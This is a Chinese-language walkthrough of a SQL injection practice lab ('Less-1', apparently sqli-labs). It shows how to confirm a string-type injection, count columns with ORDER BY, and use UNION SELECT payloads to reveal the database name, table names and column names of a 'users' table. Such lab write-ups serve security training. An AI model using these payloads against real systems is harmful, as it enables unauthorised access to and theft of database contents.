Less-1

一.判断是否存在SQL注入以及哪种注入类型

输入：?id=1，id=1’（包含引号），如果后者报错，那么表明为字符型注入

判断注入

判断为字符型注入

二.手工注入确定列数（字段）（order by）

?id=1’ order by (+数字)：

不断的去试数字，直到报错后，再利用二分法缩小范围去寻找最终的列数。

（例如：在这里 10：error；那么接下来，5：error；再接下来：2：right；3：right；4：error；那么最终的列数将为3列。）

order by 4报错

order by 3正常

三.找到数据库名（database()）

?id=-1‘ union select 1,2,3

看页面的显示结果（由于此页面只能显示一个数据，即当运行?id=1‘ union select 1,2,3时，她只能显示id=1的数据，而无法显示后面的数据，所以我们要将id=1变为id=-1，即id的数找不到为空，则将会显示后面的查询结果：union select 1,2,3 ）

2的结果显示在your login的位置上；3的结果显示在password上；那么将我们想要显示的放在2和3的位置上即可

使用database()函数找出数据库名称

?id=-1‘ union select 1,2,database()

数据库名显示在3的位置上，即数据库名为：security

四.找出对应的表

查询数据库security内的所有表名

使用information_schema.tables（输出表名信息）：

?id=-1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’) –%20

五.爆出字段名

查询users表内的所有字段名

?id=-1’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’) –%20
